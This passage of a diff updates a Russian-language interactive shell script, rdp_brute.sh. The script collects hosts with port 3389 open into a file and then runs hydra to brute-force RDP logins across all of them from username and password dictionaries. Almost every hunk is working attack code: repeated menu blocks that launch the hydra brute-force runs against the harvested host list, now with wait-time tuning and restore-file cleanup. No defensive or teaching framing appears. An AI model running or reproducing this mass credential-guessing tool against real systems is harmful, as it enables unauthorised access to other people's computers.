 ./rdp_brute.sh
@@ -12759,7 +13475,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12769,7 +13485,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12778,7 +13494,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12807,6 +13523,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12818,7 +13538,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12828,7 +13548,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12838,7 +13558,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12847,7 +13567,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12875,6 +13595,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12886,7 +13610,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12896,7 +13620,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12906,7 +13630,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12915,7 +13639,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12944,6 +13668,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -12955,7 +13683,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12965,7 +13693,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12975,7 +13703,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -12984,7 +13712,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13013,6 +13741,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13024,7 +13756,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13034,7 +13766,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13044,7 +13776,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13053,7 +13785,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13081,6 +13813,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13092,7 +13828,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13102,7 +13838,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13112,7 +13848,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13121,7 +13857,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13150,6 +13886,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13161,7 +13901,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13171,7 +13911,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13181,7 +13921,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13190,7 +13930,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13219,6 +13959,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13230,7 +13974,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13240,7 +13984,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13250,7 +13994,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13259,7 +14003,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13288,6 +14032,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13299,7 +14047,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13309,7 +14057,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13319,7 +14067,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13328,7 +14076,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13357,6 +14105,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13368,7 +14120,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13378,7 +14130,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13388,7 +14140,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13397,7 +14149,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13426,6 +14178,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13437,7 +14193,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13447,7 +14203,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13457,7 +14213,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13466,7 +14222,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13495,6 +14251,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13506,7 +14266,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13516,7 +14276,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13526,7 +14286,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13535,7 +14295,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13563,6 +14323,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -13574,7 +14338,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -13584,7 +14348,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
